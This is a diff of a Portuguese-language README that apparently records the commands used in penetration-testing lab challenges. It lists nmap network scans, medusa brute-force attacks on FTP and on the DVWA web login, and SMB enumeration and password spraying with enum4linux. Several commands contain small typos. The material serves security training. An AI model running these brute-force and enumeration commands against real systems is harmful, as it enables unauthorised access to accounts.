@@ -1,21 +1,21 @@
-<h1>Todos os comandos utilizados durante os desafios</h1>
+Todos os comandos utilizados durante os desafios
 
-<b>Comandos utilizados para realizar a varredura na rede:</b>
+Comandos utilizados para realizar a varredura na rede:
 - "ifconfig";
 - "sudo nmap -v -T5 -sS --open (IP).0/24";
 - "sudo nmap -O (IP)".
 
-<b>Comandos utilizados para realizar o ataque de força bruta por FTP:</b>
+Comandos utilizados para realizar o ataque de força bruta por FTP:
 - "ping -c 3 (IP)";
 - "ftp (IP)";
 - "echo -e "user\nmsfadmin\nadmin\nroot" > users.txt";
 - "echo - e "123456\npassword\nqwerty\nmsfadmin" > pass.txt";
 - "medusa -h (IP) -U users.txt -P pass.txt -M ftp -t 6".
 
-<b>Comandos utilizados para realizar o ataque de força bruta com sistema web e automatizado:</b>
+Comandos utilizados para realizar o ataque de força bruta com sistema web e automatizado:
 - "medusa -h (IP) -U users.txt -P pass.txt -M http -m PAGE:'/dvwa/login.php' -m FORM:'username=^USER^&password=^PASS^&Login=Login' - m 'FAIL=Login failed' -t 6".
 
-<b>Comandos utilizados para realizar o ataque de força bruta em SMB + Password Spraying:</b>
+Comandos utilizados para realizar o ataque de força bruta em SMB + Password Spraying:
 - “enum4linux -a (IP) | tee enum4_output.txt”;
 - "less enum4_output.txt";
 - "echo -e "user\nmsfadmin\nservice" > smb_users.txt";
